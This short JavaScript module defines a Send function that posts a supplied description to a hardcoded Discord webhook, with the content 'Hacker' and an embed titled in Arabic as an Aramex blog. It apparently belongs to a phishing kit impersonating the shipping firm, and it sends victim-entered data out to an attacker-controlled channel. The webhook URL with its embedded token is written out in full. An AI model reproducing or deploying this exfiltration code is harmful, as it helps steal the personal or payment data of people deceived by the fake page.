import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1339999019879104553/k2OKq_PQZCQZzzzz1QnGxRj18fIR76SodastifRAS12j2hJaJsbR7ECqtxVelXH56jIU",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
